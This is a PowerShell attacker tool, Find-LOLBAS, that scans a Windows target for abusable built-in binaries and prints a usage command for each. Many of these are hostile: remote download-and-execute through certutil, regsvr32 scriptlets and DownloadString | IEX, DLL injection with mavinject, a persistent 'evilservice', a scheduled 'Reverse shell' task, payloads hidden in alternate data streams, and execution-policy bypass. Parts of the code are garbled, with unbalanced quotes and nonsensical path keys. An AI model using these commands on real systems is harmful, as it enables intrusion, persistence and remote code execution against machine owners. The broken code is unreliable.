function Find-LOLBAS{
<#
.AUTHOR
NotoriousRebel

.SYNOPSIS
Script which can be used to find living off land binaries and scripts on a target machine.

.DESCRIPTION
The script searches through known locations of Living off Land Binaries and Scripts
and identifies if they exist. In the case they do exist it will output the name of the binary or
script, the full path, and how to use it.

.EXAMPLE
PS C:\> Find-LOLBAS

.LINK
https://github.com/LOLBAS-Project/LOLBAS
#>

function pretty_print([string] $line){
    Write-Host 'Found these binaries on the system: ' -ForegroundColor "Yellow"
    Write-Host $line
    Write-Host 'Must verify these manually: ' -ForegroundColor "Yellow"   
    Write-Host 'Bginfo.exe: bginfo.exe bginfo.bgi /popup /nolicprompt'
    Write-Host 'dnx.exe: dnx.exe consoleapp'
    Write-Host 'msxsl.exe: msxsl.exe customers.xml script.xsl';
    Write-Host 'Nvuhda6.exe: nvuhda6.exe System calc.exe'
    Write-Host 'rcsi.exe: rcsi.exe bypass.csx'
    Write-Host 'te.exe: te.exe bypass.wsc'
    Write-Host 'Tracker.exe: Tracker.exe /d .\calc.dll /c C:\Windows\write.exe'
}

function find_exes([Hashtable]$dict){
    $exes_found = @()
    $line = ""

    foreach($key in $dict.Keys){
        if (Test-Path -Path $key){
            $exes_found += $key
        }
    }

    foreach($exe in $exes_found){
        $lst =  $dict[$exe]
        $tmp = $lst[0] + ': ' + $lst[1] 
        if($tmp -eq "': S"){
          continue;  
        }
        $line += $tmp
        $line += "`r`n"
    }

    return $line
}

$localappdata = $env:LOCALAPPDATA

$dict = @{'c:\windows\explorer.exe' = 'Explorer.exe', 'explorer.exe calc.exe';
 'C:\Windows\System32' = 'Netsh.exe', 'netsh.exe trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl IPv4.Address=!(<IPofRemoteFileShare>)';
 'etsh.exe trace show stat' = 'netsh.exe', 'e trace show status';
 'c:\windows\system32\nltest.exe' = 'Nltest.exe', 'nltest.exe /SERVER:192.168.1.10 /QUERY';
 'c:\windows\system32\Openwith.exe' = 'Openwith.exe', 'OpenWith.exe /c C:\test.hta';
 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe' = 'Powershell.exe', 'powershell -ep bypass - < c:\temp:ttt';
 'C:\Windows\System32\Psr.exe' = 'Psr.exe', 'psr.exe /start /gui 0 /output c:\users\user\out.zip';
 'c:\windows\system32\binary.exe' = 'Robocopy.exe', 'Robocopy.exe C:\SourceFolder C:\DestFolder';
 'C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\' = 'AcroRd32.exe', 'Replace C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe by your binary';
 'C:\Program Files\Avast Software\Avast\aswrundll' = 'aswrundll.exe', 'C:\Program Files\Avast Software\Avast\aswrundll C:\Users\Public\Libraries\tempsys\module.dll';
 'C:\Program Files (x86)\Notepad++\updater\gpup.exe    ' = 'Gpup.exe', 'Gpup.exe -w whatever -e c:\Windows\System32\calc.exe';
 'C:\Program Files (x86)\IBM\Lotus\Notes\Notes.exe' = 'Nlnotes.exe', "NLNOTES.EXE /authenticate '=N:\Lotus\Notes\Data\notes.ini' -Command if((Get-ExecutionPolicy ) -ne AllSigned) { Set-ExecutionPolicy -Scope Process Bypass }';
 'C:\Program Files (x86)\IBM\Lotus\Notes\notes.exe' = 'Notes.exe', 'Notes.exe '=N:\Lotus\Notes\Data\notes.ini' -Command if((Get-ExecutionPolicy) -ne AllSigned) { Set-ExecutionPolicy -Scope Process Bypass }";
 'C:\windows\system32\nvuDisp.exe' = 'Nvudisp.exe', 'Nvudisp.exe System calc.exe';
 'Missing' = 'Nvuhda6.exe', 'nvuhda6.exe System calc.exe';
 'C:\Program Files (x86)\ROCCAT\ROCCAT Swarm\' = 'ROCCAT_Swarm.exe', 'Replace ROCCAT_Swarm_Monitor.exe with your binary.exe';
 'C:\OEM\Preload\utility' = 'RunCmd_X64.exe', 'RunCmd_X64 file.cmd /F';
 'C:\LJ-Ent-700-color-MFP-M775-Full-Solution-15315' = 'Setup.exe', 'Run Setup.exe';
 'C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe' = 'Usbinst.exe', 'Usbinst.exe InstallHinfSection "DefaultInstall 128 c:\temp\calc.inf"';
 'C:\Program Files\Oracle\VirtualBox Guest Additions' = 'VBoxDrvInst.exe', 'VBoxDrvInst.exe driver executeinf c:\temp\calc.inf';
 'c:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE' = 'winword.exe', 'winword.exe /l dllfile.dll';
 'c:\python27amd64\Lib\site-packages\win32com\test\testxslt.js (Visual Studio Installation)' = 'testxlst.js', 'cscript testxlst.js C:\test\test.xml c:\test\test.xls c:\test\test.out';
 'C:\Windows\System32\Atbroker.exe' = 'Atbroker.exe', 'ATBroker.exe /start malware';
 'C:\Windows\System32\bash.exe' = 'Bash.exe', 'bash.exe -c calc.exe';
 'C:\Windows\System32\bitsadmin.exe' = 'Bitsadmin.exe', 'bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1';
 'C:\Windows\System32\certutil.exe' = 'Certutil.exe', 'certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe';
 'C:\Windows\System32\cmd.exe' = 'Cmd.exe', 'cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat';
 'C:\Windows\System32\cmdkey.exe' = 'Cmdkey.exe', 'cmdkey /list';
 'C:\Windows\System32\cmstp.exe' = 'Cmstp.exe', 'cmstp.exe /ni /s c:\cmstp\CorpVPN.inf';
 'C:\Windows\System32\control.exe' = 'Control.exe', 'control.exe c:\windows\tasks\file.txt:evil.dll';
 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe' = 'Csc.exe', 'csc.exe -out:My.exe File.cs';
 'C:\Windows\System32\cscript.exe' = 'Cscript.exe', 'cscript c:\ads\file.txt:script.vbs';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe' = 'Dfsvc.exe', 'rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo';
 'C:\Windows\System32\diskshadow.exe' = 'Diskshadow.exe', 'diskshadow.exe /s c:\test\diskshadow.txt';
 'C:\Windows\System32\Dnscmd.exe' = 'Dnscmd.exe', 'dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll';
 'C:\Windows\System32\esentutl.exe' = 'Esentutl.exe', 'esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o';
 'C:\Windows\System32\eventvwr.exe' = 'Eventvwr.exe', 'eventvwr.exe';
 'C:\Windows\System32\Expand.exe' = 'Expand.exe', 'expand \\webdav\folder\file.bat c:\ADS\file.bat';
 'C:\Program Files\Internet Explorer\Extexport.exe' = 'Extexport.exe', 'Extexport.exe c:\test foo bar';
 'C:\Windows\System32\extrac32.exe' = 'Extrac32.exe', 'extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe';
 'C:\Windows\System32\findstr.exe' = 'Findstr.exe', 'findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe';
 'C:\Windows\System32\forfiles.exe' = 'Forfiles.exe', 'forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe';
 'C:\Windows\System32\ftp.exe' = 'Ftp.exe', 'echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt';
 'C:\Windows\System32\gpscript.exe' = 'Gpscript.exe', 'Gpscript /logon';
 'C:\Windows\System32\hh.exe' = 'Hh.exe', 'HH.exe http://some.url/script.ps1';
 'c:\windows\system32\ie4uinit.exe' = 'Ie4uinit.exe', 'ie4uinit.exe -BaseSettings';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe' = 'Ieexec.exe', 'ieexec.exe http://x.x.x.x:8080/bypass.exe';
 'C:\Windows\System32\Infdefaultinstall.exe' = 'Infdefaultinstall.exe', 'InfDefaultInstall.exe Infdefaultinstall.inf';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe' = 'Installutil.exe', 'InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll';
 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\Jsc.exe' = 'Jsc.exe', 'jsc.exe scriptfile.js';
 'C:\Windows\System32\makecab.exe' = 'Makecab.exe', 'makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab';
 'C:\Windows\System32\mavinject.exe' = 'Mavinject.exe', 'MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll';
 'C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe' = 'Microsoft.Workflow.Compiler.exe', 'Microsoft.Workflow.Compiler.exe tests.xml results.xml';
 'C:\Windows\System32\mmc.exe' = 'Mmc.exe', 'mmc.exe -Embedding c:\path\to\test.msc';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe' = 'Msbuild.exe', 'msbuild.exe pshell.xml';
 'C:\Windows\System32\msconfig.exe' = 'Msconfig.exe', 'Msconfig.exe -5';
 'C:\Windows\System32\Msdt.exe' = 'Msdt.exe', 'msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE';
 'C:\Windows\System32\mshta.exe' = 'Mshta.exe', 'mshta.exe evilfile.hta';
 'C:\Windows\System32\msiexec.exe' = 'Msiexec.exe', 'msiexec /quiet /i cmd.msi';
 'C:\Windows\System32\odbcconf.exe' = 'Odbcconf.exe', 'odbcconf -f file.rsp';
 'C:\Windows\System32\pcalua.exe' = 'Pcalua.exe', 'pcalua.exe -a calc.exe';
 'C:\Windows\System32\pcwrun.exe' = 'Pcwrun.exe', 'Pcwrun.exe c:\temp\beacon.exe';
 'C:\Windows\System32\Presentationhost.exe' = 'Presentationhost.exe', 'Presentationhost.exe C:\temp\Evil.xbap';
 'C:\Windows\System32\print.exe' = 'Print.exe', 'print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe';
 'C:\Windows\System32\reg.exe' = 'Reg.exe', 'reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe' = 'Regasm.exe', 'regasm.exe AllTheThingsx64.dll';
 'C:\Windows\System32\regedit.exe' = 'Regedit.exe', 'regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey';
 'C:\Windows\System32\Register-cimprovider.exe' = 'Register-cimprovider.exe', "'Register-cimprovider -path 'C:\folder\evil.dll'";
 'C:\Windows\System32\regsvcs.exe' = 'Regsvcs.exe', 'regsvcs.exe AllTheThingsx64.dll';
 'C:\Windows\System32\regsvr32.exe' = 'Regsvr32.exe', 'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll';
 'C:\Windows\System32\replace.exe' = 'Replace.exe', 'replace.exe C:\Source\File.cab C:\Destination /A';
 'C:\Windows\System32\rpcping.exe' = 'Rpcping.exe', 'rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM';
 'C:\Windows\System32\rundll32.exe' = 'Rundll32.exe', 'rundll32.exe AllTheThingsx64,EntryPoint';
 'C:\Windows\System32\runonce.exe' = 'Runonce.exe', 'Runonce.exe /AlternateShellStartup';
 'C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\Runscripthelper.exe' = 'Runscripthelper.exe', 'runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test';
 'C:\Windows\System32\sc.exe' = 'Sc.exe', "'sc create evilservice binPath='\'c:\\ADS\\file.txt:cmd.exe\' /c echo works > \'c:\ADS\works.txt\' DisplayName= 'evilservice' start= auto\ & sc start evilservice'";
 'c:\windows\system32\schtasks.exe' = "'Schtasks.exe', 'schtasks /create /sc minute /mo 1 /tn 'Reverse shell' /tr c:\some\directory\revshell.exe'";
 'C:\Windows\System32\scriptrunner.exe' = 'Scriptrunner.exe', 'Scriptrunner.exe -appvscript calc.exe';
 'C:\Windows\System32\SyncAppvPublishingServer.exe' = 'SyncAppvPublishingServer.exe', "'SyncAppvPublishingServer.exe 'n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX'";
 'C:\Windows\System32\verclsid.exe' = 'Verclsid.exe', 'verclsid.exe /S /C {CLSID}';
 'C:\Program Files\Windows Mail\wab.exe' = 'Wab.exe', 'wab.exe';
 'C:\Windows\System32\wbem\wmic.exe' = 'Wmic.exe', "'wmic.exe process call create 'c:\ads\file.txt:program.exe'";
 'C:\Windows\System32\wscript.exe' = 'Wscript.exe', 'wscript c:\ads\file.txt:script.vbs';
 'C:\Windows\System32\wsreset.exe' = 'Wsreset.exe', 'wsreset.exe';
 'C:\Windows\System32\xwizard.exe' = 'Xwizard.exe', 'xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}';
 'c:\windows\system32\advpack.dll' = 'Advpack.dll', 'rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,';
 'c:\windows\system32\ieadvpack.dll' = 'Ieadvpack.dll', 'rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,';
 'c:\windows\system32\ieframe.dll' = 'Ieaframe.dll', "'rundll32.exe ieframe.dll,OpenURL 'C:\test\calc.url'";
 'c:\windows\system32\mshtml.dll' = 'Mshtml.dll', "'rundll32.exe Mshtml.dll,PrintHTML 'C:\temp\calc.hta'";
 'c:\windows\system32\pcwutl.dll' = 'Pcwutl.dll', 'rundll32.exe pcwutl.dll,LaunchApplication calc.exe';
 'c:\windows\system32\setupapi.dll' = 'Setupapi.dll', 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\shady.inf';
 'c:\windows\system32\shdocvw.dll' = 'Shdocvw.dll', "'rundll32.exe shdocvw.dll,OpenURL 'C:\test\calc.url'";
 'c:\windows\system32\shell32.dll' = 'Shell32.dll', 'rundll32.exe shell32.dll,Control_RunDLL payload.dll';
 'c:\windows\system32\syssetup.dll' = 'Syssetup.dll', 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\test\shady.inf';
 'c:\windows\system32\url.dll' = 'Url.dll', "'rundll32.exe url.dll,OpenURL 'C:\test\calc.hta'";
 'c:\windows\system32\zipfldr.dll' = 'Zipfldr.dll', 'rundll32.exe zipfldr.dll,RouteTheCall calc.exe';
 'C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1' = 'CL_Invocation.ps1', '. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \nSyncInvoke <executable> [args]';
 'C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1' = 'CL_Mutexverifiers.ps1', '. C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess calc.ps1';
 'C:\Windows\System32\manage-bde.wsf' = 'Manage-bde.wsf', 'set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf';
 'c:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat' = 'Pester.bat', "'Pester.bat [/help|?|-?|/?] '$null; notepad'";
 'C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs' = 'Pubprn.vbs', 'pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct';
 'C:\Windows\System32\slmgr.vbs' = 'Slmgr.vbs', 'reg.exe import c:\path\to\Slmgr.reg & cscript.exe /b c:\windows\system32\slmgr.vbs';
 'C:\Windows\System32\SyncAppvPublishingServer.vbs' = 'Syncappvpublishingserver.vbs', "'SyncAppvPublishingServer.vbs 'n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX'";
 'C:\Windows\System32\winrm.vbs' = 'winrm.vbs', 'reg.exe import c:\path\to\Slmgr.reg & winrm quickconfig';
 'C:\Program Files\Microsoft Office\root\client\appvlp.exe' = 'Appvlp.exe', 'AppVLP.exe \\webdav\calc.bat';
 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe' = 'Cdb.exe', 'cdb.exe -cf x64_calc.wds -o notepad.exe';
 'c:\Program Files (x86)\Microsoft Visual Studio\2017\Community\MSBuild\15.0\Bin\Roslyn\csi.exe' = 'csi.exe', 'csi.exe file';
 'C:\Windows\System32\dxcap.exe' = 'Dxcap.exe', 'Dxcap.exe -c C:\Windows\System32\notepad.exe';
 'C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x86' = 'Mftrace.exe', 'Mftrace.exe cmd.exe';
 'C:\Program Files (x86)\IIS\Microsoft Web Deploy V3\msdeploy.exe' = 'Msdeploy.exe', "'msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand='c:\temp\calc.bat'";
 'C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe' = 'Sqldumper.exe', 'sqldumper.exe 464 0 0x0110';
 'C:\Program files (x86)\Microsoft SQL Server\100\Tools\Binn\sqlps.exe' = 'Sqlps.exe', 'Sqlps.exe -noprofile';
 'C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe' = 'SQLToolsPS.exe', 'SQLToolsPS.exe -noprofile -command Start-Process calc.exe';
 '${localappdata}\Microsoft\Teams\current\Squirrel.exe' = 'Squirrel.exe', 'squirrel.exe --download [url to package]';
 '${localappdata}\Microsoft\Teams\update.exe' = 'Update.exe', 'Update.exe --download [url to package]';
 'c:\windows\system32\vsjitdebugger.exe' = 'vsjitdebugger.exe', 'Vsjitdebugger.exe calc.exe';
 'C:\Windows\System32\wsl.exe' = 'Wsl.exe', 'wsl.exe -e /mnt/c/Windows/System32/calc.exe'
  }
  $line = find_exes($dict)
  pretty_print($line)
}

Find-LOLBAS
